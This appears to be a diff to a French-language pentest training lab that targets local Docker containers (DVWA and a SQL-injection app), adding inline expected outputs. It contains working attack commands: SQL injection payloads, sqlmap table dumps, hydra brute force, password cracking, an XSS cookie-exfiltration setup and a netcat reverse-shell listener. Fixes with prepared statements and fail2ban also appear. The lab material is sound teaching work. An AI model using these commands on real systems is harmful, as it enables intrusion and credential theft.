@@ -275,6 +275,7 @@ Un bon plan = une feuille de route qui couvre la **reconnaissance**, l'**exploit
 mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
 # Lister les conteneurs cibles disponibles
 docker compose ps --services
+# → dvwa, sqli-app, vsftpd, buffovf, waf, secure-linux, forensic-victim
 ```
 
 Notez les services exposés par chaque conteneur (ports, protocoles). Vous utiliserez cette information pour choisir vos techniques d'attaque.
@@ -322,6 +323,7 @@ Documentez ce tableau dans `rendu_labs/jour-01/plan-attaque-j1.md`.
 cd /chemin/vers/techniques-de-hacking-niveau-1
 source env.sh
 docker compose up -d --build dvwa sqli-app
+# → Container dvwa-target started, Container sqli-app-target started
 ```
 
 Vérifiez que les cibles répondent :
@@ -435,13 +437,10 @@ Avant tout pentest, on scanne la cible pour cartographier sa surface d'attaque. 
 ```bash
 mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
 nmap -sV -p 8088 localhost | tee nmap_dvwa.txt
+# → PORT     STATE SERVICE VERSION
+# → 8088/tcp open  http    Apache httpd 2.4.X
 ```
 
-**Résultat attendu :**
-```
-PORT     STATE SERVICE VERSION
-8088/tcp open  http    Apache httpd 2.4.X
-```
 Le flag `-sV` interroge la bannière du service pour obtenir la version exacte. `tee` sauvegarde la sortie dans `nmap_dvwa.txt` pour le rapport.
 
 **Explication :** Le scan de ports est la première étape de tout pentest ([TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance). Connaître la version d'Apache permet de chercher des CVE associées. Sans cette information, l'attaquant travaille en aveugle.
@@ -463,14 +462,10 @@ Le flag `-sV` interroge la bannière du service pour obtenir la version exacte. 
 cd rendu_labs/jour-01
 gobuster dir -u http://localhost:8088 \
   -w /usr/share/wordlists/dirb/common.txt -q | tee gobuster_dvwa.txt
-```
-
-**Résultat attendu :**
-```
-/login.php (Status: 200)
-/vulnerabilities (Status: 301)
-/config (Status: 301)
-/setup.php (Status: 200)
+# → /login.php (Status: 200)
+# → /vulnerabilities (Status: 301)
+# → /config (Status: 301)
+# → /setup.php (Status: 200)
 ```
 Le flag `-u` définit l'URL cible, `-w` la wordlist de noms à tester (ici `common.txt`), `-q` masque la bannière. `tee` copie la sortie dans un fichier.
 
@@ -493,15 +488,12 @@ Le flag `-u` définit l'URL cible, `-w` la wordlist de noms à tester (ici `comm
 curl -s -c /tmp/dvwa_cookie.txt \
   -d "username=admin&password=password&Login=Login" \
   "http://localhost:8088/login.php" | grep -o "Welcome\|Login failed"
+# → Welcome
 
 curl -s -b /tmp/dvwa_cookie.txt -c /tmp/dvwa_cookie.txt \
   -d "security=low&seclev_submit=Submit" \
   "http://localhost:8088/security.php"
-```
-
-**Résultat attendu :**
-```
-Welcome
+# → (pas de sortie visible — le cookie est mis à jour avec security=low)
 ```
 La première commande doit afficher `Welcome` (authentification réussie). Le flag `-c` sauvegarde le cookie reçu dans `/tmp/dvwa_cookie.txt`. La seconde commande utilise `-b` pour renvoyer ce cookie et `-c` pour le mettre à jour avec `security=low`.
 
@@ -532,6 +524,7 @@ La première commande doit afficher `Welcome` (authentification réussie). Le fl
 **Commande :**
 ```bash
 docker exec dvwa-target bash -c "echo 'ServerName localhost' >> /etc/apache2/apache2.conf && echo 'Options -Indexes' >> /etc/apache2/conf-enabled/security.conf && apache2ctl restart"
+# → AH00558: apache2: Could not reliably determine... (warning, OK)
 docker exec dvwa-target bash -c "mkdir -p /var/www/html/test-empty"
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:8088/test-empty/"
 # → 403 (directory listing désactivé)
@@ -610,6 +603,7 @@ Le terminal affiche : `Serving HTTP on 0.0.0.0 port 8000 ...` et reste en attent
 2. **Terminal 2** — Récupérer l'IP de Kali pour la mettre dans le payload :
 ```bash
 hostname -I
+# → 192.168.X.X (ou 10.0.X.X, selon votre réseau)
 ```
 
 3. **Terminal 2** — Dans Firefox → **XSS (Reflected)**, entrer le payload suivant en remplaçant `<KALI_IP>` par l'IP obtenue :
@@ -727,11 +721,7 @@ La requête `SELECT first_name, last_name FROM users WHERE user_id = '$id'` devi
 curl -s -b /tmp/dvwa_cookie.txt \
   "http://localhost:8088/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+%23&Submit=Submit" \
   | grep -c "First name"
-```
-
-**Résultat attendu :**
-```
-5
+# → 5
 ```
 Au lieu de `1` (un seul utilisateur normalement). Le flag `-b` envoie le cookie de session. Les caractères `%27` = `'`, `%20` = espace, `%23` = `#` sont l'encodage URL des caractères spéciaux.
 
@@ -791,19 +781,16 @@ sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 **Commande (simulation de correction) :**
 ```bash
-# Code vulnérable actuel :
-# $query = "SELECT * FROM users WHERE user_id = '$id'";
+# Code vulnérable :
+#   $query = "SELECT * FROM users WHERE user_id = '$id'";
+# Code corrigé :
+#   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
+#   $stmt->execute([$id]);
 
-# Code corrigé avec requête préparée PDO :
-# $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
-# $stmt->execute([$id]);
-
-# Vérification : sqlmap après correction ne trouve plus rien
 sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --load-cookies=/tmp/dvwa_cookie.txt --batch 2>&1 | grep -o "not injectable\|injectable"
+# → not injectable
 ```
-
-**Résultat attendu :** `not injectable` — sqlmap confirme que le paramètre n'est plus injectable.
 
 **Explication :** Avec les requêtes préparées, la valeur de `$id` est transmise **séparément** du code SQL. Même si `$id` contient `1' OR '1'='1'`, la base de données ne l'interprète pas comme du SQL — c'est une chaîne de caractères inoffensive. Ajoutez un WAF (ModSecurity) et du bcrypt pour les mots de passe, et la défense est complète.
 
@@ -869,12 +856,13 @@ La fonction `shell_exec("ping -c 4 " . $target)` exécute tout ce qui suit `ping
 *Terminal 1 — écouteur :*
 ```bash
 nc -lvnp 4444
+# → Listening on 0.0.0.0:4444 (en attente de connexion...)
 ```
 
 *Terminal 2 — trouver l'IP docker0 :*
 ```bash
 ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
-# → généralement 172.17.0.1
+# → 172.17.0.1 (généralement, selon votre réseau Docker)
 ```
 
 *Terminal 2 — injecter le reverse shell (via l'interface web DVWA) :*
@@ -987,13 +975,13 @@ mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
 **Commande :**
 ```bash
 curl -s "http://localhost:8083/?page=search&id=1" | grep -o "Laptop\|Monitor\|Keyboard"
-# → Laptop Pro X
+# → Laptop Pro X  (comportement normal : 1 seul produit)
 
 curl -s "http://localhost:8083/?page=search&id=1%20OR%201=1" | grep -c "<tr>"
-# → 6 (tous les produits)
+# → 6  (tous les produits retournés : injection confirmée)
 
 curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
-# → Aucun produit trouvé
+# → Aucun produit trouvé  (AND 1=2 = toujours faux)
 ```
 
 **Résultat attendu :** `1 OR 1=1` retourne 6 produits au lieu d'1. `AND 1=2` retourne "Aucun produit trouvé".
@@ -1010,13 +998,13 @@ curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
 **Commande :**
 ```bash
 curl -s -d "page=login&username=admin&password=wrong" "http://localhost:8083/" | grep "Identifiants"
-# → Identifiants incorrects
+# → Identifiants incorrects  (comportement normal)
 
 curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep "Connecté"
-# → Connecté en tant que admin
+# → Connecté en tant que admin  (bypass du mot de passe réussi)
 
 curl -s -d "page=login&username='%20OR%20'1'='1'%20--&password=x" "http://localhost:8083/" | grep -c "Connecté"
-# → 6
+# → 6  (tous les utilisateurs connectés)
 ```
 
 **Résultat attendu :** `admin' --` se connecte sans mot de passe. `' OR '1'='1' --` connecte 6 utilisateurs.
@@ -1060,6 +1048,7 @@ curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,user
 **Commande :**
 ```bash
 sqlmap -u "http://localhost:8083/?page=search&id=1" --tables --batch 2>&1 | tee sqli_tables.txt
+# → [2 tables] → products, users
 ```
 
 **Résultat attendu :**
@@ -1074,6 +1063,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --tables --batch 2>&1 | tee 
 **Commande :**
 ```bash
 sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
+# → [5 columns] → id, username, password, email, role
 ```
 
 **Résultat attendu :**
@@ -1093,6 +1083,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
 ```bash
 sqlmap -u "http://localhost:8083/?page=search&id=1" \
   -T users -C username,password,email,role --dump --batch 2>&1 | tee sqli_dump.txt
+# → 6 users extracted (admin, john_doe, jane_dev, supervisor, guest, flag_user)
 ```
 
 **Résultat attendu :**
@@ -1144,6 +1135,7 @@ sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
 
 john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null
 john --show --format=raw-md5 hashes.txt
+# → admin:password, john_doe:password123, jane_dev:abc123, ...
 ```
 
 **Résultat attendu :**
@@ -1173,6 +1165,7 @@ flag_user:admin
 **Commande :**
 ```bash
 hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
+# → Session... completed (mêmes résultats que john)
 ```
 
 > **Checkpoint C :** Au moins 3 mots de passe craqués. Le `flag_user` utilise `admin` comme mot de passe — une erreur classique.
@@ -1195,6 +1188,7 @@ hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
 cd rendu_labs/jour-01
 sqlmap -u "http://localhost:8083/?page=search&id=1" \
   -T products -C name,secret_flag --dump --batch
+# → FLAG{sql_injection_master} trouvé dans Laptop Pro X
 ```
 
 **Résultat attendu :**
@@ -1363,6 +1357,8 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   -s 8088 localhost http-post-form \
   "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V 2>&1 \
   | tee hydra_dvwa.txt
+# → [8088][http-post-form] host: localhost   login: admin   password: password
+# → 1 of 1 target successfully completed, 1 valid password found
 ```
 
 **Résultat attendu :**
@@ -1396,6 +1392,8 @@ hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
   -s 8088 localhost http-post-form \
   "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -F 2>&1 \
   | tee hydra_multi.txt
+# → [8088][http-post-form] host: localhost   login: admin   password: password
+# → [STATUS] attack finished for localhost (valid pair found)
 ```
 
 **Résultat attendu :**
@@ -1425,6 +1423,7 @@ hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
 **Commande :**
 ```bash
 docker exec dvwa-target bash -c "apt-get update && apt-get install -y fail2ban"
+# → fail2ban already installed / installing...
 
 docker exec dvwa-target bash -c "cat > /etc/fail2ban/jail.local << 'EOF'
 [apache-dvwa]
@@ -1437,12 +1436,10 @@ findtime = 600
 bantime  = 900
 EOF
 fail2ban-client reload"
+# → Restarting fail2ban: ok.
 
 docker exec dvwa-target bash -c "fail2ban-client status apache-dvwa"
 # → Status for the jail: apache-dvwa  |  Currently banned: 0
-
-# Re-tester Hydra après fail2ban :
-# hydra ... → [ERROR] connection refused!  (l'IP est bannie après 5 échecs)
 ```
 
 **Résultat attendu :** `fail2ban-client status` confirme que la règle est active. Après 5 tentatives échouées, Hydra reçoit une erreur `connection refused` — l'IP est bannie.
